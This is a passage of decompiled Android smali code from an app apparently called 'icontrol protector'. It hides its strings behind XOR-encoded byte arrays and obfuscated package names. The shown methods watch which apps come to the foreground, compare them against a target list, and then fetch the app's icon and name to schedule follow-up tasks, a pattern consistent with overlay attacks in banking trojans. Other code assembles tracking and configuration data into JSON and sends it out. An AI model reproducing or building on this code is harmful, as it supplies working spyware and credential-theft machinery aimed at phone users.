    invoke-virtual {v1, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v3, v3, [B

    fill-array-data v3, :array_26

    new-array v6, v4, [B

    fill-array-data v6, :array_27

    invoke-static {v3, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    sget-object v6, Lcom/icontrol/protector/b$b;->g:Lcom/icontrol/protector/b$b;

    invoke-static {v6}, Lcom/icontrol/protector/b;->a(Lcom/icontrol/protector/b$b;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v1, v3, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v3, v5, [B

    fill-array-data v3, :array_28

    new-array v6, v4, [B

    fill-array-data v6, :array_29

    invoke-static {v3, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v0, v2, [B

    fill-array-data v0, :array_2a

    new-array v2, v4, [B

    fill-array-data v2, :array_2b

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sget-object v2, Lntidisestablish/neumonoul/floccinaucinih/ab;->a:Ljava/lang/String;

    invoke-virtual {v1, v0, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v0, v5, [B

    fill-array-data v0, :array_2c

    new-array v2, v4, [B

    fill-array-data v2, :array_2d

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sget-object v2, Lcom/icontrol/protector/My_Configs;->Tracking_Data_str:Ljava/lang/String;

    invoke-virtual {v1, v0, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {v1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0}, Lcom/icontrol/protector/LiveChat;->g(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p0

    invoke-virtual {p0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_0
    return-void

    :array_0
    .array-data 1
        0xct
        -0x52t
        0x1et
        -0x5t
    .end array-data

    :array_1
    .array-data 1
        0x78t
        -0x29t
        0x6et
        -0x62t
        0x5et
        0x25t
        0x3dt
        -0x2bt
    .end array-data

    :array_2
    .array-data 1
        -0x59t
        -0x68t
        0x39t
    .end array-data

    :array_3
    .array-data 1
        -0x3at
        -0x4t
        0x5dt
        -0x21t
        0x54t
        -0x71t
        0x29t
        0x2ct
    .end array-data

    :array_4
    .array-data 1
        0x52t
        -0x28t
        0x15t
        0x66t
        -0x74t
        -0x1ct
        -0x7t
        0xft
        0x4ft
        -0x2bt
    .end array-data

    nop

    :array_5
    .array-data 1
        0x22t
        -0x50t
        0x7at
        0x8t
        -0x17t
        -0x45t
        -0x69t
        0x6et
    .end array-data

    :array_6
    .array-data 1
        0x2dt
        -0x19t
    .end array-data

    nop

    :array_7
    .array-data 1
        0x6et
        -0x57t
        0x16t
        -0x4bt
        -0x14t
        -0x41t
        0x40t
        0x1ct
    .end array-data

    :array_8
    .array-data 1
        -0x51t
        -0x55t
        0xft
        -0x24t
        -0x8t
        0x6at
        0x77t
        -0x57t
        -0x48t
        -0x60t
        0x19t
        -0x23t
        -0x2t
        0x6ct
        0x7dt
    .end array-data

    :array_9
    .array-data 1
        -0x32t
        -0x3bt
        0x6bt
        -0x52t
        -0x69t
        0x3t
        0x13t
        -0xat
    .end array-data

    :array_a
    .array-data 1
        0x4ct
        -0x25t
        0x1dt
        -0x2et
        0x27t
    .end array-data

    nop

    :array_b
    .array-data 1
        0x21t
        -0x4ct
        0x79t
        -0x49t
        0x4bt
        0x36t
        -0x40t
        -0x59t
    .end array-data

    :array_c
    .array-data 1
        -0x31t
        -0x21t
        0x4bt
        -0x53t
        -0x47t
        -0x9t
        -0x4dt
        -0x47t
        -0x32t
        -0x2at
        0x5et
        -0x55t
        -0x45t
        -0x20t
    .end array-data

    nop

    :array_d
    .array-data 1
        -0x53t
        -0x42t
        0x3ft
        -0x27t
        -0x24t
        -0x7bt
        -0x36t
        -0x1at
    .end array-data

    :array_e
    .array-data 1
        -0x71t
        -0x6ft
        -0x49t
        0x7at
        0x59t
        -0x5t
        -0x68t
        0x66t
        -0x63t
        -0x7et
        -0x5at
        0x6dt
        0x59t
        -0x19t
        -0x6bt
        0x58t
        -0x76t
        -0x6bt
    .end array-data

    nop

    :array_f
    .array-data 1
        -0x13t
        -0x10t
        -0x3dt
        0xet
        0x3ct
        -0x77t
        -0x1ft
        0x39t
    .end array-data

    :array_10
    .array-data 1
        -0x3bt
        -0x39t
        -0x5bt
        -0x1ft
        -0x13t
        0x1et
        0x1et
    .end array-data

    :array_11
    .array-data 1
        -0x55t
        -0x5et
        -0x2ft
        -0x6at
        -0x7et
        0x6ct
        0x75t
        0x14t
    .end array-data

    :array_12
    .array-data 1
        -0x16t
        -0x48t
        -0x23t
        -0x15t
        0x5t
        0x63t
        0x27t
        -0x5dt
        -0x19t
        -0x49t
        -0x26t
        -0x6t
    .end array-data

    :array_13
    .array-data 1
        -0x7dt
        -0x2at
        -0x52t
        -0x61t
        0x64t
        0xft
        0x4bt
        -0x4t
    .end array-data

    :array_14
    .array-data 1
        -0x3et
        0x72t
        -0x62t
        0x47t
        0x42t
        0x43t
        0x9t
        -0x25t
    .end array-data

    :array_15
    .array-data 1
        -0x4et
        0x1at
        -0xft
        0x29t
        0x27t
        0x1ct
        0x60t
        -0x41t
    .end array-data

    :array_16
    .array-data 1
        -0x43t
        0x11t
    .end array-data

    nop

    :array_17
    .array-data 1
        -0xct
        0x55t
        -0x3ct
        0x4et
        -0xdt
        0x10t
        0x12t
        -0x2at
    .end array-data

    :array_18
    .array-data 1
        -0x67t
        -0x78t
        0xft
        -0x36t
        0x5t
        0x46t
        0x73t
        -0x1bt
    .end array-data

    :array_19
    .array-data 1
        -0x23t
        -0x13t
        0x79t
        -0x5dt
        0x66t
        0x23t
        0x1at
        -0x7ft
    .end array-data

    :array_1a
    .array-data 1
        0x68t
        0x69t
        0x29t
        0x17t
        0x11t
        -0x4bt
        0x1bt
    .end array-data

    :array_1b
    .array-data 1
        0x1ft
        0x8t
        0x45t
        0x7bt
        0x61t
        -0x2ct
        0x6bt
        0x66t
    .end array-data

    :array_1c
    .array-data 1
        0x72t
        0x65t
        0x48t
    .end array-data

    :array_1d
    .array-data 1
        0x1t
        0xct
        0x25t
        -0x7et
        -0x66t
        -0x36t
        -0x55t
        -0x6ct
    .end array-data

    :array_1e
    .array-data 1
        -0x19t
        -0x41t
        -0x70t
        0x6ct
        0x52t
        0x63t
        0x31t
    .end array-data

    :array_1f
    .array-data 1
        -0x74t
        -0x26t
        -0x17t
        0x0t
        0x3dt
        0x4t
        0x42t
        0x7ct
    .end array-data

    :array_20
    .array-data 1
        -0x4et
        -0x59t
        -0xbt
        0x54t
        -0x34t
    .end array-data

    nop

    :array_21
    .array-data 1
        -0x3ct
        -0x3at
        -0x7bt
        0x24t
        -0x41t
        -0x7ct
        0x55t
        -0x7at
    .end array-data

    :array_22
    .array-data 1
        0x1et
        -0x6ct
        0x9t
        0x6ft
        -0x32t
        -0x64t
    .end array-data

    nop

    :array_23
    .array-data 1
        0x7ft
        -0x9t
        0x7dt
        0x6t
        -0x48t
        -0x1at
        0x59t
        -0x6t
    .end array-data

    :array_24
    .array-data 1
        -0x2at
        -0xft
        -0x56t
        -0x42t
        -0x6et
        -0x4at
        0x44t
    .end array-data

    :array_25
    .array-data 1
        -0x48t
        -0x62t
        -0x22t
        -0x29t
        -0xct
        -0x31t
        0x37t
        -0xct
    .end array-data

    :array_26
    .array-data 1
        -0x46t
        0x41t
        0x6bt
        -0x3ct
        0x11t
        0x70t
    .end array-data

    nop

    :array_27
    .array-data 1
        -0x34t
        0xdt
        0x2t
        -0x56t
        0x7at
        0x3t
        -0x68t
        -0x55t
    .end array-data

    :array_28
    .array-data 1
        -0xbt
        0x5at
        0x42t
    .end array-data

    :array_29
    .array-data 1
        -0x64t
        0x3et
        0x24t
        0x69t
        -0x35t
        0x37t
        -0x58t
        0x25t
    .end array-data

    :array_2a
    .array-data 1
        -0x76t
        -0x46t
        -0x65t
        -0x4ft
    .end array-data

    :array_2b
    .array-data 1
        -0x38t
        -0x12t
        -0x33t
        -0x1dt
        0x15t
        0x57t
        -0x3t
        -0x7bt
    .end array-data

    :array_2c
    .array-data 1
        -0x7et
        0x2ft
        0x53t
    .end array-data

    :array_2d
    .array-data 1
        -0x2at
        0x7dt
        0x18t
        -0x4ft
        -0x6ft
        -0x7ft
        0x61t
        0x47t
    .end array-data
.end method

.method private m(Landroid/content/Context;)V
    .locals 19

    .line 1
    move-object/from16 v8, p1

    const/16 v9, 0xa

    new-array v0, v9, [B

    fill-array-data v0, :array_0

    const/16 v10, 0x8

    new-array v1, v10, [B

    fill-array-data v1, :array_1

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v8, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/usage/UsageStatsManager;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    const-wide/16 v3, 0x7d0

    sub-long v3, v1, v3

    invoke-virtual {v0, v3, v4, v1, v2}, Landroid/app/usage/UsageStatsManager;->queryEvents(JJ)Landroid/app/usage/UsageEvents;

    move-result-object v11

    new-instance v12, Landroid/app/usage/UsageEvents$Event;

    invoke-direct {v12}, Landroid/app/usage/UsageEvents$Event;-><init>()V

    :goto_0
    invoke-virtual {v11}, Landroid/app/usage/UsageEvents;->hasNextEvent()Z

    move-result v0

    if-eqz v0, :cond_7

    invoke-virtual {v11, v12}, Landroid/app/usage/UsageEvents;->getNextEvent(Landroid/app/usage/UsageEvents$Event;)Z

    invoke-virtual {v12}, Landroid/app/usage/UsageEvents$Event;->getPackageName()Ljava/lang/String;

    move-result-object v0

    invoke-virtual/range {p1 .. p1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    goto :goto_0

    :cond_0
    invoke-virtual {v12}, Landroid/app/usage/UsageEvents$Event;->getPackageName()Ljava/lang/String;

    move-result-object v4

    const/4 v13, 0x2

    const/16 v14, 0x64

    const/4 v15, 0x1

    const/16 v16, 0x0

    const/16 v7, 0x90

    if-eqz v4, :cond_2

    :try_start_0
    invoke-virtual {v12}, Landroid/app/usage/UsageEvents$Event;->getEventType()I

    move-result v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    const-string v1, ""

    if-ne v0, v15, :cond_1

    :try_start_1
    sget-object v0, Lcom/icontrol/protector/a;->d:Ljava/util/ArrayList;

    invoke-virtual {v0, v4}, Ljava/util/ArrayList;->contains(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    const/16 v0, 0xd

    new-array v0, v0, [B

    fill-array-data v0, :array_2

    new-array v2, v10, [B

    fill-array-data v2, :array_3

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    sget-object v0, Lcom/icontrol/protector/AccessServices;->s:Ljava/lang/String;

    invoke-virtual {v4, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Lcom/icontrol/protector/AccessServices;->t:Ljava/lang/String;

    invoke-virtual {v0, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_2

    sput-object v4, Lcom/icontrol/protector/AccessServices;->s:Ljava/lang/String;

    sput-object v1, Lcom/icontrol/protector/AccessServices;->t:Ljava/lang/String;

    new-instance v0, Ljava/io/File;

    invoke-virtual/range {p1 .. p1}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v1

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    new-array v3, v9, [B

    fill-array-data v3, :array_4

    new-array v5, v10, [B

    fill-array-data v5, :array_5

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/16 v3, 0xb

    new-array v3, v3, [B

    fill-array-data v3, :array_6

    new-array v5, v10, [B

    fill-array-data v5, :array_7

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-direct {v0, v1, v2}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    if-eqz v0, :cond_2

    :try_start_2
    invoke-virtual/range {p1 .. p1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    invoke-virtual {v0, v4}, Landroid/content/pm/PackageManager;->getApplicationIcon(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v0
    :try_end_2
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_2 .. :try_end_2} :catch_0
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_1

    :catch_0
    move-exception v0

    :try_start_3
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    move-object/from16 v0, v16

    :goto_1
    invoke-static {v0, v7, v7}, Lcom/icontrol/protector/n;->t(Landroid/graphics/drawable/Drawable;II)Landroid/graphics/Bitmap;

    move-result-object v0

    new-instance v6, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v6}, Ljava/io/ByteArrayOutputStream;-><init>()V

    sget-object v1, Landroid/graphics/Bitmap$CompressFormat;->PNG:Landroid/graphics/Bitmap$CompressFormat;

    invoke-virtual {v0, v1, v14, v6}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    invoke-virtual {v6}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v17

    invoke-static {v8, v4}, Lcom/icontrol/protector/n;->z(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    new-instance v3, Ljava/util/Timer;

    invoke-direct {v3}, Ljava/util/Timer;-><init>()V

    new-instance v2, Lcom/icontrol/protector/WorkServices$d$b;

    move-object v1, v2

    move-object v9, v2

    move-object/from16 v2, p0

    move-object v14, v3

    move-object/from16 v3, p1

    move-object/from16 v18, v6

    move-object/from16 v6, v17

    move-object/from16 v7, p1

    invoke-direct/range {v1 .. v7}, Lcom/icontrol/protector/WorkServices$d$b;-><init>(Lcom/icontrol/protector/WorkServices$d;Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;[BLandroid/content/Context;)V

    const-wide/16 v1, 0x1f4

    invoke-virtual {v14, v9, v1, v2}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;J)V

    invoke-virtual {v0}, Landroid/graphics/Bitmap;->recycle()V

    invoke-virtual/range {v18 .. v18}, Ljava/io/ByteArrayOutputStream;->close()V

    goto :goto_2

    :cond_1
    invoke-virtual {v12}, Landroid/app/usage/UsageEvents$Event;->getEventType()I

    move-result v0

    if-ne v0, v13, :cond_2

    sget-object v0, Lcom/icontrol/protector/AccessServices;->s:Ljava/lang/String;

    if-eqz v0, :cond_2

    invoke-static {v8, v4}, Lcom/icontrol/protector/a;->N(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_2

    sput-object v16, Lcom/icontrol/protector/AccessServices;->s:Ljava/lang/String;

    sput-object v1, Lcom/icontrol/protector/AccessServices;->t:Ljava/lang/String;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    :catch_1
    :cond_2
    :goto_2
    sget-object v0, Lcom/icontrol/protector/a;->h:Ljava/util/Map;

    invoke-interface {v0}, Ljava/util/Map;->entrySet()Ljava/util/Set;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object v9

    :goto_3
    invoke-interface {v9}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_6

    invoke-interface {v9}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/util/Map$Entry;

    :try_start_4
    invoke-interface {v0}, Ljava/util/Map$Entry;->getKey()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    invoke-interface {v0}, Ljava/util/Map$Entry;->getValue()Ljava/lang/Object;

    move-result-object v0

    move-object v4, v0

    check-cast v4, Ljava/lang/String;

    sget-object v0, Lcom/icontrol/protector/a;->i:Ljava/util/Map;

    invoke-interface {v0, v1}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    move-object v1, v0

    check-cast v1, Ljava/lang/String;

    sget-object v0, Lcom/icontrol/protector/WorkServices$d;->d:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3

    return-void

    :cond_3
    invoke-virtual {v12}, Landroid/app/usage/UsageEvents$Event;->getEventType()I

    move-result v0

    if-ne v0, v15, :cond_4

    invoke-virtual {v12}, Landroid/app/usage/UsageEvents$Event;->getPackageName()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_4

    sput-object v1, Lcom/icontrol/protector/WorkServices$d;->d:Ljava/lang/String;

    const/16 v0, 0xc

    new-array v0, v0, [B

    fill-array-data v0, :array_8

    new-array v2, v10, [B

    fill-array-data v2, :array_9

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_4

    :try_start_5
    invoke-virtual/range {p1 .. p1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    invoke-virtual {v0, v1}, Landroid/content/pm/PackageManager;->getApplicationIcon(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v0
    :try_end_5
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_5 .. :try_end_5} :catch_2
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_4

    :goto_4
    const/16 v14, 0x90

    goto :goto_5

    :catch_2
    move-exception v0

    :try_start_6
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    move-object/from16 v0, v16

    goto :goto_4

    :goto_5
    invoke-static {v0, v14, v14}, Lcom/icontrol/protector/n;->t(Landroid/graphics/drawable/Drawable;II)Landroid/graphics/Bitmap;

    move-result-object v0

    new-instance v7, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v7}, Ljava/io/ByteArrayOutputStream;-><init>()V

    sget-object v2, Landroid/graphics/Bitmap$CompressFormat;->PNG:Landroid/graphics/Bitmap$CompressFormat;
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_4

    const/16 v6, 0x64

    :try_start_7
    invoke-virtual {v0, v2, v6, v7}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    invoke-virtual {v7}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v17

    invoke-static {v8, v1}, Lcom/icontrol/protector/n;->z(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    new-instance v3, Ljava/util/Timer;

    invoke-direct {v3}, Ljava/util/Timer;-><init>()V

    new-instance v2, Lcom/icontrol/protector/WorkServices$d$c;
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_3

    move-object v1, v2

    move-object v14, v2

    move-object/from16 v2, p0

    move-object v15, v3

    move-object/from16 v3, p1

    move/from16 v18, v6

    move-object/from16 v6, v17

    move-object/from16 v17, v7

    move-object/from16 v7, p1

    :try_start_8
    invoke-direct/range {v1 .. v7}, Lcom/icontrol/protector/WorkServices$d$c;-><init>(Lcom/icontrol/protector/WorkServices$d;Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;[BLandroid/content/Context;)V

    const-wide/16 v1, 0x3e9

    invoke-virtual {v15, v14, v1, v2}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;J)V

    invoke-virtual {v0}, Landroid/graphics/Bitmap;->recycle()V

    invoke-virtual/range {v17 .. v17}, Ljava/io/ByteArrayOutputStream;->close()V

    goto :goto_7

    :catch_3
    move/from16 v18, v6

    goto :goto_6

    :catch_4
    const/16 v18, 0x64

    goto :goto_6

    :cond_4
    const/16 v18, 0x64

    invoke-virtual {v12}, Landroid/app/usage/UsageEvents$Event;->getEventType()I

    move-result v0

    if-ne v0, v13, :cond_5

    invoke-virtual {v12}, Landroid/app/usage/UsageEvents$Event;->getPackageName()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_5

    const/4 v0, 0x4

    new-array v0, v0, [B

    fill-array-data v0, :array_a

    new-array v1, v10, [B

    fill-array-data v1, :array_b

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/WorkServices$d;->d:Ljava/lang/String;

    const/16 v0, 0x10

    new-array v0, v0, [B

    fill-array-data v0, :array_c

    new-array v1, v10, [B

    fill-array-data v1, :array_d

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_5

    :catch_5
    :cond_5
    :goto_6
    const/4 v15, 0x1

    goto/16 :goto_3

    :cond_6
    :goto_7
    const/16 v9, 0xa

    goto/16 :goto_0

    :cond_7
    const-wide/16 v0, 0x3e8

    :try_start_9
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_9
    .catch Ljava/lang/InterruptedException; {:try_start_9 .. :try_end_9} :catch_6

    goto :goto_8

    :catch_6
    move-exception v0

    move-object v1, v0

    invoke-virtual {v1}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_8
    return-void

    nop

    :array_0
    .array-data 1
        0x6bt
        -0x25t
        0x2dt
        -0x19t
        -0x7bt
        -0x4bt
        0x34t
        -0x2bt
        0x6at
        -0x25t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x1et
        -0x58t
        0x4ct
        -0x80t
        -0x20t
        -0x3at
        0x40t
        -0x4ct
    .end array-data

    :array_2
    .array-data 1
        0x27t
        -0x54t
        -0x4dt
        -0x3dt
        -0x50t
        -0x7dt
        -0x6ct
        -0x66t
        0x28t
        -0x56t
        -0x5ct
        -0x2et
        -0xct
    .end array-data

    nop

    :array_3
    .array-data 1
        0x4dt
        -0x37t
        -0x30t
        -0x49t
        -0x70t
        -0x19t
        -0xft
        -0x12t
    .end array-data

    :array_4
    .array-data 1
        0x6et
        0x4ct
        -0x5ft
        -0xft
        -0x50t
        -0x7bt
        0x7t
        -0x1bt
        0x7at
        0x11t
    .end array-data

    nop

    :array_5
    .array-data 1
        0x1et
        0x3et
        -0x32t
        -0x7bt
        -0x2bt
        -0x1at
        0x73t
        -0x80t
    .end array-data

    :array_6
    .array-data 1
        -0x63t
        0x44t
        0x2et
        -0x34t
        0x1ct
        0x2ct
        -0xet
        0x7ct
        -0x3at
        0x40t
        0x2ct
    .end array-data

    :array_7
    .array-data 1
        -0x4et
        0x2dt
        0x40t
        -0x58t
        0x79t
        0x54t
        -0x24t
        0x14t
    .end array-data

    :array_8
    .array-data 1
        -0x78t
        -0x38t
        -0x53t
        0xft
        -0x25t
        0x3t
        0x7at
        -0x7ft
        -0x56t
        -0x34t
        -0x48t
        0x4bt
    .end array-data

    :array_9
    .array-data 1
        -0x37t
        -0x48t
        -0x23t
        0x2ft
        -0x41t
        0x66t
        0xet
        -0x1ct
    .end array-data

    :array_a
    .array-data 1
        -0x7bt
        -0x12t
        0x1t
        -0x7et
    .end array-data

    :array_b
    .array-data 1
        -0x15t
        -0x65t
        0x6dt
        -0x12t
        0x16t
        0x1ct
        0x4t
        -0x79t
    .end array-data

    :array_c
    .array-data 1
        0x61t
        0x32t
        -0x4at
        -0x5ct
        0x14t
        -0x6ft
        0x5t
        0x2bt
        0x43t
        0x36t
        -0x5dt
        -0x20t
        0x50t
        -0x65t
        0x4t
        0x3at
    .end array-data

    :array_d
    .array-data 1
        0x20t
        0x42t
        -0x3at
        -0x7ct
        0x70t
        -0xct
        0x71t
        0x4et
    .end array-data
.end method

.method public static p(Landroid/content/Context;)V
    .locals 2

    .line 1
    sget-object v0, Lntidisestablish/neumonoul/floccinaucinih/ab;->R:Ljava/lang/String;

    sget-object v1, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {p0, v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/sq;->f(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    const-wide/16 v0, 0x0

    sput-wide v0, Lcom/icontrol/protector/WorkServices$d;->c:J

    return-void
.end method

.method public static q(Landroid/content/Context;)V
    .locals 2

    .line 1
    sget-object v0, Lntidisestablish/neumonoul/floccinaucinih/ab;->Q:Ljava/lang/String;

    sget-object v1, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {p0, v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/sq;->f(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    const-wide/16 v0, 0x0

    sput-wide v0, Lcom/icontrol/protector/WorkServices$d;->b:J

    return-void
.end method

.method public static r(Landroid/content/Context;)V
    .locals 2

    .line 1
    sget-object v0, Lntidisestablish/neumonoul/floccinaucinih/ab;->S:Ljava/lang/String;

    sget-object v1, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {p0, v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/sq;->f(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    const-wide/16 v0, 0x0

    sput-wide v0, Lcom/icontrol/protector/WorkServices$d;->e:J

    return-void
.end method


# virtual methods
.method protected bridge synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 0

    check-cast p1, [Landroid/content/Context;

    invoke-virtual {p0, p1}, Lcom/icontrol/protector/WorkServices$d;->h([Landroid/content/Context;)Ljava/lang/String;

    move-result-object p1

    return-object p1
.end method

.method protected varargs h([Landroid/content/Context;)Ljava/lang/String;
    .locals 12

    .line 1
    sget-object v0, Lcom/icontrol/protector/WorkServices;->p:Ljava/util/concurrent/locks/ReentrantLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantLock;->isLocked()Z

    move-result v0

    const/4 v1, 0x0

    if-eqz v0, :cond_0

    return-object v1

    :cond_0
    const/4 v0, 0x0

    aget-object p1, p1, v0

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    sget-object v4, Lcom/icontrol/protector/WorkServices;->p:Ljava/util/concurrent/locks/ReentrantLock;

    invoke-virtual {v4}, Ljava/util/concurrent/locks/ReentrantLock;->lock()V

    const/4 v4, 0x1

    iput-boolean v4, p0, Lcom/icontrol/protector/WorkServices$d;->a:Z

    invoke-static {}, Lntidisestablish/neumonoul/floccinaucinih/y9;->a()Lntidisestablish/neumonoul/floccinaucinih/y9;

    move-result-object v5

    sget-object v6, Lcom/icontrol/protector/My_Configs;->ALL_CONFIG:Ljava/lang/String;

    invoke-virtual {v5, p1, v6}, Lntidisestablish/neumonoul/floccinaucinih/y9;->b(Landroid/content/Context;Ljava/lang/String;)V

    const/4 v6, 0x5

    new-array v6, v6, [B

    fill-array-data v6, :array_0

    const/16 v7, 0x8

    new-array v8, v7, [B

    fill-array-data v8, :array_1

    invoke-static {v6, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {p1, v6}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/os/PowerManager;

    :catch_0
    :cond_1
    :goto_0
